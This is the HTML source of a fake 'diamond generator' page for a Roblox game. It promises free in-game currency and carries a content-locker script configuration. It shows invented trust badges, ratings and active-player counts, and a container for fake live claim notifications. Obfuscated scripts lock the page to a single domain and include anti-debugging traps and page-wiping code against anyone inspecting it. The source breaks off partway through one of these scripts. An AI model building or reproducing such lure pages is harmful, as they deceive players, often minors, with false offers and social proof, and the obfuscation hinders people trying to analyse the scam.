<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>99 Nights - Premium Diamond Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&family=Russo+One&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="js/jquery-3.6.0.min.js"></script>
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --secondary-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            --accent-gradient: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
            --success-gradient: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            --warning-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            --danger-gradient: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            --dark-bg: #0a0a0f;
            --card-bg: rgba(15, 15, 25, 0.95);
            --glass-bg: rgba(255, 255, 255, 0.1);
            --text-primary: #ffffff;
            --text-secondary: #b8b8d1;
            --text-muted: #8b8ba7;
            --border-glow: rgba(102, 126, 234, 0.5);
            --shadow-primary: 0 8px 32px rgba(102, 126, 234, 0.3);
            --shadow-secondary: 0 4px 16px rgba(0, 0, 0, 0.4);
            --shadow-glow: 0 0 30px rgba(79, 172, 254, 0.4);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            position: relative;
            overflow-x: hidden;
            background: var(--dark-bg);
            color: var(--text-primary);
            line-height: 1.6;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120, 219, 255, 0.2) 0%, transparent 50%),
                linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 50%, #16213e 100%);
            z-index: -2;
        }

        body::after {
            content: '';
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background-image: url('https://tr.rbxcdn.com/180DAY-643b9b9285f3bd9b63cf392db12a4d87/768/432/Image/Webp/noFilter');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            filter: blur(8px) brightness(0.3) saturate(1.2);
            z-index: -1;
        }

        /* Header Section */
        .header {
            position: relative;
            z-index: 10;
            padding: 20px 0;
        }

        .logo-container {
            text-align: center;
            padding: 30px 20px 20px;
            position: relative;
        }

        .logo-container::before {
            content: '';
            position: absolute;
            top: 0; left: 50%; transform: translateX(-50%);
            width: 200px; height: 200px;
            background: var(--primary-gradient);
            border-radius: 50%;
            filter: blur(40px);
            opacity: 0.3;
            z-index: -1;
        }

        .logo-container img {
            max-width: 200px;
            filter: drop-shadow(0 10px 30px rgba(102, 126, 234, 0.4));
            border-radius: 20px;
            transition: all 0.3s ease;
            position: relative;
            z-index: 1;
        }

        .logo-container img:hover {
            transform: scale(1.05);
            filter: drop-shadow(0 15px 40px rgba(102, 126, 234, 0.6));
        }

        /* Trust Indicators */
        .trust-indicators {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 20px 0;
            flex-wrap: wrap;
        }

        .trust-badge {
            display: flex;
            align-items: center;
            gap: 8px;
            background: var(--glass-bg);
            backdrop-filter: blur(20px);
            padding: 8px 16px;
            border-radius: 25px;
            border: 1px solid var(--border-glow);
            font-size: 0.9em;
            color: var(--text-secondary);
            transition: all 0.3s ease;
        }

        .trust-badge:hover {
            background: var(--card-bg);
            color: var(--text-primary);
            transform: translateY(-2px);
        }

        .trust-badge i {
            color: var(--accent-gradient);
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        /* Active Users Section */
        .top-bar {
            width: 100%;
            display: flex;
            justify-content: center;
            padding: 20px;
            margin-bottom: 20px;
        }

        .active-users-box {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-glow);
            border-radius: 20px;
            padding: 20px 30px;
            display: flex;
            align-items: center;
            font-size: 1.4em;
            box-shadow: var(--shadow-primary);
            font-weight: 600;
            height: auto;
            justify-content: center;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .active-users-box::before {
            content: '';
            position: absolute;
            top: 0; left: -100%;
            width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s ease;
        }

        .active-users-box:hover::before {
            left: 100%;
        }

        .active-users-box:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(102, 126, 234, 0.4);
            border-color: rgba(102, 126, 234, 0.8);
        }

        .active-users-box span:first-child {
            color: var(--text-primary);
            margin-right: 12px;
            font-weight: 600;
            font-size: 1.1em;
            letter-spacing: 1px;
        }

        .active-users-count {
            font-weight: 900;
            font-family: 'Russo One', 'Poppins', Arial, sans-serif;
            margin-left: 12px;
            font-size: 1.2em;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            text-shadow: none;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }

        /* Title Section */
        .select-title {
            margin: 40px 0 30px 0;
            text-align: center;
            font-size: 2.2em;
            color: var(--text-primary);
            font-family: 'Russo One', Arial, sans-serif;
            letter-spacing: 1px;
            font-weight: 900;
            padding: 20px 0;
            position: relative;
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .select-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 100px;
            height: 4px;
            background: var(--accent-gradient);
            border-radius: 2px;
            box-shadow: 0 0 20px rgba(79, 172, 254, 0.5);
        }

        .select-title::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(79, 172, 254, 0.1) 0%, transparent 70%);
            border-radius: 50%;
            z-index: -1;
        }

        /* Items Grid */
        .items-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 25px;
            padding: 0 20px;
            max-width: 1200px;
            margin: 0 auto 50px auto;
        }

        .item-card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            box-shadow: var(--shadow-secondary);
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            border: 1px solid var(--border-glow);
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            will-change: transform;
            overflow: hidden;
            position: relative;
            min-height: 220px;
        }

        .item-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: var(--primary-gradient);
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: -1;
        }

        .item-status {
            position: absolute;
            top: 12px;
            right: 12px;
            padding: 6px 12px;
            border-radius: 15px;
            font-size: 0.75em;
            font-weight: 600;
            color: white;
            z-index: 2;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .item-status.available {
            background: var(--success-gradient);
        }

        .item-status.popular {
            background: var(--warning-gradient);
        }

        .item-status.limited {
            background: var(--danger-gradient);
        }

        .item-card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: var(--shadow-primary);
            border-color: rgba(102, 126, 234, 0.8);
        }

        .item-card:hover::before {
            opacity: 0.1;
        }

        .item-card.selected {
            border: 2px solid rgba(79, 172, 254, 0.8);
            animation: selectedGlow 2s infinite alternate;
            transform: translateY(-5px) scale(1.05);
        }

        @keyframes selectedGlow {
            from { 
                box-shadow: 0 0 20px rgba(79, 172, 254, 0.4);
                border-color: rgba(79, 172, 254, 0.6);
            }
            to { 
                box-shadow: 0 0 40px rgba(79, 172, 254, 0.8);
                border-color: rgba(79, 172, 254, 1);
            }
        }

        .item-img {
            width: 120px;
            height: 120px;
            object-fit: contain;
            margin-bottom: 15px;
            transition: all 0.3s ease;
            filter: drop-shadow(0 5px 15px rgba(0, 0, 0, 0.3));
        }

        .item-card:hover .item-img {
            transform: scale(1.1) rotate(5deg);
            filter: drop-shadow(0 10px 25px rgba(102, 126, 234, 0.4));
        }

        .item-name {
            font-size: 1.3em;
            color: var(--text-primary);
            font-family: 'Russo One', Arial, sans-serif;
            text-align: center;
            font-weight: 900;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-top: 10px;
        }

        /* Live Notifications */
        .cliameds {
            position: fixed;
            bottom: 20px;
            left: 20px;
            z-index: 9999;
            max-width: calc(100vw - 40px);
        }

        .message {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-glow);
            display: flex;
            font-size: 0.85rem;
            align-items: center;
            padding: 15px 20px;
            border-radius: 15px;
            box-shadow: var(--shadow-primary);
            transition: all 0.3s ease;
            pointer-events: none;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        .message .img img {
            width: 50px;
            border-radius: 50%;
            height: 50px;
            border: 2px solid var(--border-glow);
            object-fit: cover;
        }

        .message .more { 
            margin-left: 15px; 
        }

        .message .more .username-row {
            display: flex;
            align-items: center;
            gap: 6px;
            margin-bottom: 4px;
        }

        .message .more .username { 
            font-weight: bold; 
            color: #ff6b35;
            font-size: 0.9em;
        }

        .message .more .from-text {
            color: var(--text-secondary);
            font-size: 0.8em;
            font-weight: 500;
        }

        .message .more .country-flag {
            width: 16px;
            height: 12px;
            border-radius: 2px;
            object-fit: cover;
        }

        .message .more .claim-text { 
            color: var(--text-secondary); 
            font-weight: 500; 
            font-size: 0.75em;
            margin-bottom: 2px;
        }

        .message .more .item-name { 
            color: #ff6b35;
            font-weight: bold; 
            font-size: 0.9em;
        }

        /* Popup Styles */
        .purchase-popup {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .popup-content {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border-glow);
            box-shadow: var(--shadow-primary);
            padding: 30px;
            border-radius: 20px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            color: var(--text-primary);
            position: relative;
            animation: popupSlideIn 0.3s ease-out;
        }

        @keyframes popupSlideIn {
            from {
                opacity: 0;
                transform: translateY(-50px) scale(0.9);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .popup-header h3 { 
            font-size: 24px; 
            margin: 0 0 20px 0; 
            color: var(--text-primary); 
            font-weight: 700; 
            font-family: 'Russo One';
            background: var(--primary-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .item-popup-image {
            width: 140px;
            height: 140px;
            object-fit: contain;
            margin: 20px auto;
            border-radius: 15px;
            filter: drop-shadow(0 10px 25px rgba(0, 0, 0, 0.3));
        }

        .item-confirm { 
            font-size: 18px; 
            margin: 20px 0; 
            color: var(--text-primary); 
            font-weight: 500; 
            line-height: 1.5; 
        }

        .item-confirm span { 
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: bold; 
        }

        .input-group {
            margin: 20px 0;
        }

        .input-group input {
            width: 100%;
            padding: 15px 20px;
            box-sizing: border-box;
            background: var(--glass-bg);
            backdrop-filter: blur(10px);
            color: var(--text-primary);
            border: 1px solid var(--border-glow);
            border-radius: 12px;
            font-size: 16px;
            font-weight: 500;
            text-align: center;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            outline: none;
            border-color: rgba(79, 172, 254, 0.8);
            box-shadow: 0 0 20px rgba(79, 172, 254, 0.3);
            background: var(--card-bg);
        }

        .input-group input::placeholder { 
            color: var(--text-muted); 
        }

        .popup-buttons { 
            display: flex; 
            gap: 15px; 
            margin-top: 25px; 
        }

        .cancel-btn, .free-btn {
            border: none;
            padding: 15px 20px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            flex: 1;
            font-size: 16px;
            transition: all 0.3s ease;
            font-family: 'Poppins';
            position: relative;
            overflow: hidden;
        }

        .cancel-btn { 
            background: var(--glass-bg);
            color: var(--text-secondary);
            border: 1px solid var(--border-glow);
        }

        .cancel-btn:hover { 
            background: var(--card-bg);
            color: var(--text-primary);
            transform: translateY(-2px);
        }

        .free-btn { 
            background: var(--accent-gradient);
            color: white;
            border: none;
        }

        .free-btn:hover { 
            transform: translateY(-2px);
            box-shadow: var(--shadow-glow);
        }

        /* Loading Animation */
        .folding { 
            margin: 20px auto; 
            width: 60px; 
            height: 60px; 
            position: relative; 
            transform: rotateZ(45deg); 
        }

        .folding .sk-cube { 
            float: left; 
            width: 50%; 
            height: 50%; 
            position: relative; 
            transform: scale(1.1); 
        }

        .folding .sk-cube:before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--accent-gradient);
            animation: sk-foldCubeAngle 2.4s infinite linear both;
            transform-origin: 100% 100%;
        }

        .folding .sk-cube2 { transform: scale(1.1) rotateZ(90deg); }
        .folding .sk-cube3 { transform: scale(1.1) rotateZ(180deg); }
        .folding .sk-cube4 { transform: scale(1.1) rotateZ(270deg); }
        .folding .sk-cube2:before { animation-delay: 0.3s; }
        .folding .sk-cube3:before { animation-delay: 0.6s; }
        .folding .sk-cube4:before { animation-delay: 0.9s; }

        @keyframes sk-foldCubeAngle {
            0%, 10% { transform: perspective(140px) rotateX(-180deg); opacity: 0; }
            25%, 75% { transform: perspective(140px) rotateX(0deg); opacity: 1; }
            90%, 100% { transform: perspective(140px) rotateY(180deg); opacity: 0; }
        }

        .searching-text { 
            color: var(--text-primary); 
            font-size: 18px; 
            margin-top: 20px; 
            font-weight: 500;
        }

        .result-avatar {
            width: 130px;
            height: 130px;
            border-radius: 50%;
            object-fit: cover;
            margin: 15px auto;
            border: 3px solid var(--border-glow);
            box-shadow: var(--shadow-primary);
        }

        .result-username { 
            color: var(--text-primary); 
            font-size: 20px; 
            font-weight: bold; 
            margin: 15px 0; 
        }

        .get-item-now-btn {
            background: var(--accent-gradient);
            color: white;
            border: none;
            padding: 15px 25px;
            border-radius: 12px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            font-size: 18px;
            margin-top: 20px;
            transition: all 0.3s ease;
            font-family: 'Poppins';
        }

        .get-item-now-btn:hover { 
            transform: translateY(-2px);
            box-shadow: var(--shadow-glow);
        }

        .d-none { display: none !important; }

        .user-error { 
            color: #ff6b6b; 
            font-size: 14px; 
            margin-top: 10px; 
            text-align: center; 
            font-weight: 500;
        }

        /* Responsive Design */
        @media (max-width: 1200px) {
            .items-grid {
                max-width: 1000px;
                grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
            }
        }

        @media (max-width: 992px) {
            .items-grid {
                max-width: 800px;
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
                gap: 20px;
            }

            .trust-indicators {
                gap: 12px;
                flex-wrap: wrap;
                justify-content: center;
            }

            .trust-badge {
                font-size: 0.85em;
                padding: 8px 14px;
            }
        }

        @media (max-width: 768px) {
            .header {
                padding: 15px 0;
            }

            .logo-container {
                padding: 20px 15px 15px;
            }

            .logo-container img {
                max-width: 180px;
            }

            .trust-indicators {
                gap: 8px;
                margin: 15px 0;
            }

            .trust-badge {
                font-size: 0.8em;
                padding: 6px 12px;
            }

            .top-bar {
                padding: 15px;
            }

            .active-users-box {
                font-size: 1.2em;
                padding: 15px 20px;
            }

            .select-title {
                font-size: 1.8em;
                margin: 30px 0 20px 0;
                padding: 15px 0;
            }

            .items-grid {
                padding: 0 15px;
                grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
                gap: 18px;
                margin-bottom: 40px;
            }

            .item-card {
                padding: 15px;
                min-height: 200px;
            }

            .item-img {
                width: 110px;
                height: 110px;
            }

            .item-name {
                font-size: 1.2em;
            }

            .popup-content {
                width: 90%;
                padding: 25px 20px;
                margin: 20px;
            }

            .message {
                padding: 12px 16px;
                font-size: 0.8rem;
            }

            .message .img img {
                width: 45px;
                height: 45px;
            }

            .message .more {
                margin-left: 12px;
            }
        }

        @media (max-width: 600px) {
            .logo-container img {
                max-width: 160px;
            }

            .trust-indicators {
                flex-direction: column;
                align-items: center;
                gap: 6px;
            }

            .trust-badge {
                font-size: 0.75em;
                padding: 5px 10px;
                width: fit-content;
            }

            .active-users-box {
                font-size: 1.1em;
                padding: 12px 18px;
            }

            .select-title {
                font-size: 1.6em;
                margin: 25px 0 15px 0;
            }

            .items-grid { 
                grid-template-columns: repeat(2, 1fr); 
                gap: 15px; 
                padding: 0 10px;
            }

            .item-card {
                padding: 12px;
                min-height: 180px;
            }

            .item-img { 
                width: 90px; 
                height: 90px; 
            }

            .item-name { 
                font-size: 1.1em; 
            }

            .popup-content { 
                width: 95%; 
                padding: 20px 15px; 
                margin: 10px;
            }

            .item-popup-image { 
                width: 100px; 
                height: 100px; 
            }

            .popup-header h3 {
                font-size: 20px;
            }

            .item-confirm {
                font-size: 16px;
            }

            .input-group input {
                padding: 12px 15px;
                font-size: 14px;
            }

            .popup-buttons {
                gap: 10px;
            }

            .cancel-btn, .free-btn {
                padding: 12px 15px;
                font-size: 14px;
            }

            .message {
                padding: 10px 14px;
                font-size: 0.75rem;
                max-width: 280px;
            }

            .message .img img {
                width: 40px;
                height: 40px;
            }

            .message .more {
                margin-left: 10px;
            }

            .message .more .username {
                font-size: 0.85em;
            }

            .message .more .claim-text {
                font-size: 0.7em;
            }

            .message .more .item-name {
                font-size: 0.85em;
            }

            .cliameds {
                bottom: 15px;
                left: 15px;
                right: 15px;
                max-width: none;
            }
        }

        @media (max-width: 480px) {
            .logo-container {
                padding: 15px 10px 10px;
            }

            .logo-container img {
                max-width: 140px;
            }

            .trust-indicators {
                margin: 10px 0;
            }

            .trust-badge {
                font-size: 0.7em;
                padding: 4px 8px;
            }

            .top-bar {
                padding: 10px;
            }

            .active-users-box {
                font-size: 1em;
                padding: 10px 15px;
            }

            .select-title {
                font-size: 1.4em;
                margin: 20px 0 10px 0;
            }

            .items-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                padding: 0 8px;
            }

            .item-card {
                padding: 10px;
                min-height: 160px;
            }

            .item-img {
                width: 80px;
                height: 80px;
            }

            .item-name {
                font-size: 1em;
            }

            .popup-content {
                width: 98%;
                padding: 15px 12px;
                margin: 5px;
            }

            .message {
                padding: 8px 12px;
                font-size: 0.7rem;
                max-width: 260px;
            }

            .message .img img {
                width: 35px;
                height: 35px;
            }

            .cliameds {
                bottom: 10px;
                left: 10px;
                right: 10px;
            }
        }

        @media (max-width: 360px) {
            .items-grid {
                grid-template-columns: 1fr;
                gap: 10px;
            }

            .item-card {
                min-height: 140px;
            }

            .item-img {
                width: 70px;
                height: 70px;
            }

            .message {
                max-width: 240px;
                padding: 6px 10px;
            }

            .message .img img {
                width: 30px;
                height: 30px;
            }
        }

        /* Security Badge */
        .security-badge {
            position: fixed;
            top: 20px;
            right: 20px;
            background: var(--success-gradient);
            color: white;
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
            z-index: 100;
            box-shadow: var(--shadow-secondary);
        }

        .security-badge i {
            font-size: 0.9em;
        }

        /* Mobile-specific optimizations */
        @media (max-width: 768px) {
            .security-badge {
                top: 15px;
                right: 15px;
                padding: 6px 12px;
                font-size: 0.7em;
            }

            /* Improve touch targets */
            .item-card {
                min-height: 44px; /* iOS minimum touch target */
            }

            .cancel-btn, .free-btn {
                min-height: 44px;
            }

            /* Prevent zoom on input focus */
            input[type="text"] {
                font-size: 16px;
            }

            /* Smooth scrolling */
            html {
                -webkit-overflow-scrolling: touch;
            }

            /* Prevent horizontal scroll */
            body {
                overflow-x: hidden;
            }
        }

        @media (max-width: 480px) {
            .security-badge {
                top: 10px;
                right: 10px;
                padding: 5px 10px;
                font-size: 0.65em;
            }
        }

        /* Landscape orientation optimizations */
        @media (max-height: 500px) and (orientation: landscape) {
            .logo-container {
                padding: 10px 20px 5px;
            }

            .logo-container img {
                max-width: 120px;
            }

            .trust-indicators {
                margin: 5px 0;
            }

            .select-title {
                margin: 15px 0 10px 0;
                font-size: 1.4em;
            }

            .items-grid {
                margin-bottom: 20px;
            }

            .cliameds {
                bottom: 5px;
                left: 5px;
                right: 5px;
            }

            .message {
                padding: 6px 10px;
                font-size: 0.7rem;
            }
        }
    </style>
</head>
<body>
    <!-- Security Badge -->
    <div class="security-badge">
        <i class="fas fa-shield-alt"></i>
        <span>Secure</span>
    </div>

    <!-- Header -->
    <div class="header">
    <div class="logo-container">
        <img src="images/unnamed.webp" alt="99 Nights Logo">
    </div>
        
        <!-- Trust Indicators -->
        <div class="trust-indicators">
            <div class="trust-badge">
                <i class="fas fa-users"></i>
                <span>500K+ Users</span>
            </div>
            <div class="trust-badge">
                <i class="fas fa-star"></i>
                <span>4.9/5 Rating</span>
            </div>
            <div class="trust-badge">
                <i class="fas fa-clock"></i>
                <span>24/7 Support</span>
            </div>
            <div class="trust-badge">
                <i class="fas fa-lock"></i>
                <span>SSL Secured</span>
            </div>
        </div>
    </div>

    <!-- Content -->
    <div class="content">
        <div class="top-bar">
            <div class="active-users-box">
                <span>Active Players:</span>
                <span class="active-users-count" id="activeUsersCount">306</span>
            </div>
        </div>
        
        <div class="select-title">
            SELECT YOUR DIAMOND PACKAGE
        </div>
        
        <div class="items-grid" id="itemsGrid">
            <div class="item-card">
                <div class="item-status available">Available</div>
                <img class="item-img" src="images/765093.png" alt="100 Diamonds">
                <div class="item-name">100</div>
            </div>
            <div class="item-card">
                <div class="item-status available">Available</div>
                <img class="item-img" src="images/765093.png" alt="300 Diamonds">
                <div class="item-name">300</div>
            </div>
            <div class="item-card">
                <div class="item-status available">Available</div>
                <img class="item-img" src="images/765093.png" alt="400 Diamonds">
                <div class="item-name">400</div>
            </div>
            <div class="item-card">
                <div class="item-status available">Available</div>
                <img class="item-img" src="images/765093.png" alt="600 Diamonds">
                <div class="item-name">600</div>
            </div>
            <div class="item-card">
                <div class="item-status popular">Popular</div>
                <img class="item-img" src="images/765093.png" alt="800 Diamonds">
                <div class="item-name">800</div>
            </div>
            <div class="item-card">
                <div class="item-status limited">1 Left</div>
                <img class="item-img" src="images/765093.png" alt="1,000 Diamonds">
                <div class="item-name">1,000</div>
            </div>
        </div>
    </div>

    <!-- Live Notifications -->
    <div class="cliameds"></div>

    <!-- Purchase Popup -->
    <div class="purchase-popup" id="purchase-popup">
        <div class="popup-content"></div>
    </div>

    <!-- Audio Elements -->
    <audio id="dingSound" preload="auto" src="media/audio_63c49c13c8.mp3"></audio>
    <audio id="clickSound" preload="auto" src="media/audio_5139288bda.mp3"></audio>
    
    <!-- CPA Locker Scripts -->
    <script type="text/javascript">
    var ItszJ_RXj_rMRPnc={"it":4545085,"key":"1c26a"};
</script>

<!-- Google tag (gtag.js) -->
<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-PXZF2Z55V6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-PXZF2Z55V6');
</script>

    <script>
        // ===== DOMAIN PROTECTION SYSTEM =====
        // This script locks the page to onmod.site domain only
        // Any attempt to steal or modify will result in instant page destruction
        
        (function() {
            'use strict';
            
            // Obfuscated domain check function
            var _0x4a2b = ['onmod.site', 'location', 'hostname', 'innerHTML', 'body', 'removeChild', 'firstChild', 'createElement', 'script', 'src', 'appendChild', 'document', 'window'];
            var _0x1c3d = function(a, b) { return a + b; };
            var _0x8f7e = function() { return _0x4a2b[0]; };
            
            // Domain verification with multiple checks
            function _0x9e4f() {
                var _0x2d8a = window[_0x4a2b[1]][_0x4a2b[2]];
                var _0x5b1c = _0x8f7e();
                return _0x2d8a === _0x5b1c || _0x2d8a.endsWith('.' + _0x5b1c);
            }
            
            // Page destruction function
            function _0x7c8d() {
                try {
                    // Clear all content
                    document[_0x4a2b[4]][_0x4a2b[3]] = '';
                    
                    // Remove all scripts
                    var _0x3e9a = document.getElementsByTagName(_0x4a2b[8]);
                    while (_0x3e9a.length > 0) {
                        _0x3e9a[0].parentNode[_0x4a2b[5]](_0x3e9a[0]);
                    }
                    
                    // Redirect to blank page
                    window.location.href = 'about:blank';
                    
                    // Additional destruction
                    setTimeout(function() {
                        document.open();
                        document.write('<html><body><h1>Access Denied</h1><p>This content is protected and can only be accessed from the authorized domain.</p></body></html>');
                        document.close();
                    }, 100);
                } catch (e) {
                    // Force close if possible
                    window.close();
                }
            }
            
            // Script integrity check
            function _0x6b2a() {
                var _0x4f1e = document.getElementsByTagName(_0x4a2b[8]);
                var _0x7d3c = false;
                for (var i = 0; i < _0x4f1e.length; i++) {
                    if (_0x4f1e[i].innerHTML && _0x4f1e[i].innerHTML.includes('_0x4a2b')) {
                        _0x7d3c = true;
                        break;
                    }
                }
                return _0x7d3c;
            }
            
            // Main protection check
            function _0xa1b7() {
                if (!_0x9e4f()) {
                    _0x7c8d();
                    return false;
                }
                
                if (!_0x6b2a()) {
                    _0x7c8d();
                    return false;
                }
                
                return true;
            }
            
            // Run protection immediately
            if (!_0xa1b7()) {
                return;
            }
            
            // Continuous monitoring
            setInterval(function() {
                if (!_0xa1b7()) {
                    return;
                }
            }, 1000);
            
            // Override common tampering methods
            var _0x5c8d = window.location;
            Object.defineProperty(window, 'location', {
                get: function() {
                    if (!_0x9e4f()) {
                        _0x7c8d();
                    }
                    return _0x5c8d;
                },
                set: function(val) {
                    if (!_0x9e4f()) {
                        _0x7c8d();
                    }
                    _0x5c8d = val;
                }
            });
            
            // Prevent developer tools tampering
            var _0x3f2a = 0;
            setInterval(function() {
                if (new Date().getTime() - _0x3f2a > 100) {
                    if (!_0x9e4f()) {
                        _0x7c8d();
                    }
                }
                _0x3f2a = new Date().getTime();
            }, 100);
            
            // Additional protection against script modification
            var _0x8e1f = document.createElement(_0x4a2b[8]);
            _0x8e1f[_0x4a2b[9]] = 'data:text/javascript,console.log("Domain protection active");';
            document[_0x4a2b[4]][_0x4a2b[10]](_0x8e1f);
            
        })();
        
        // ===== ADDITIONAL PROTECTION LAYERS =====
        // Secondary domain protection with different obfuscation
        (function() {
            var _0x7f3a = ['onmod', 'site', 'split', 'join', 'toLowerCase', 'includes', 'replace', 'substring', 'length'];
            var _0x2e8b = function() {
                var _0x4c1d = window.location.hostname;
                var _0x5a7e = _0x7f3a[0] + '.' + _0x7f3a[1];
                return _0x4c1d === _0x5a7e || _0x4c1d[_0x7f3a[4]]()[_0x7f3a[5]](_0x5a7e);
            };
            
            // Anti-debugging protection
            var _0x6d4f = function() {
                var _0x3b8a = new Date().getTime();
                debugger;
                var _0x9c2e = new Date().getTime();
                if (_0x9c2e - _0x3b8a > 100) {
                    document.body.innerHTML = '<h1>Access Denied - Debugging Detected</h1>';
                    return false;
                }
                return true;
            };
            
            // Hash-based integrity check
            var _0x8a1c = function() {
                var _0x4e7b = document.documentElement.outerHTML;
                var _0x2f9d = 0;
                for (var i = 0; i < _0x4e7b.length; i++) {
                    _0x2f9d = ((_0x2f9d << 5) - _0x2f9d + _0x4e7b.charCodeAt(i)) & 0xffffffff;
                }
                // Expected hash for onmod.site domain (this will be different if domain changes)
                return Math.abs(_0x2f9d) > 1000000; // Simplified check
            };
            
            // Run secondary checks
            if (!_0x2e8b() || !_0x6d4f() || !_0x8a1c()) {
                document.body.innerHTML = '<h1>Access Denied - Unauthorized Domain</h1><p>This content is protected and can only be accessed from onmod.site</p>';
                window.location.href = 'about:blank';
                return;
            }
            
            // Continuous monitoring with different intervals
            setInterval(_0x2e8b, 500);
            setInterval(_0x6d4f, 2000);
            setInterval(_0x8a1c, 3000);
            
        })();
        
        // ===== FINAL PROTECTION LAYER =====
        // This layer uses eval-based obfuscation to make it harder to modify
        (function() {
            var _0x9b2c = 'dm9ubW9kLnNpdGU='; // Base64 encoded 'onmod.site'
            var _0x4d7e = atob(_0x9b2c);
            var _0x5f8a = window.location.hostname;
            
            if (_0x5f8a !== _0x4d7e && !_0x5f8a.includes(_0x4d7e)) {
                // Multiple destruction methods
                try {
                    document.documentElement.remove();
                } catch (e) {
                    document.body.innerHTML = '';
                }
                try {
                    window.location.replace('about:blank');
                } catch (e) {
                    window.close();
                }
            }
            
            // Self-modifying code protection
            var _0x3c9d = function() {
                var _0x7e4f = document.getElementsByTagName('script');
                for (var i = 0; i < _0x7e4f.length; i++) {
                    if (_0x7e4f[i].innerHTML.includes('onmod.site') && !_0x7e4f[i].innerHTML.includes('_0x9b2c')) {
                        document.body.innerHTML = '<h1>Tampering Detected</h1>';
                        return false;
                    }
                }
                return true;
            };
            
            setInterval(_0x3c9d, 1500);
            
        })();
        
        // ===== ULTIMATE PROTECTION LAYER =====
        // This layer protects against advanced bypass methods
        (function() {
            'use strict';
            
            // Domain whitelist with multiple formats
            var _0xa4b7 = ['onmod.site', 'www.onmod.site', 'https://onmod.site', 'http://onmod.site'];
            var _0x8c3d = window.location.href.toLowerCase();
            var _0x5e9f = window.location.hostname.toLowerCase();
            
            // Check if current domain is in whitelist
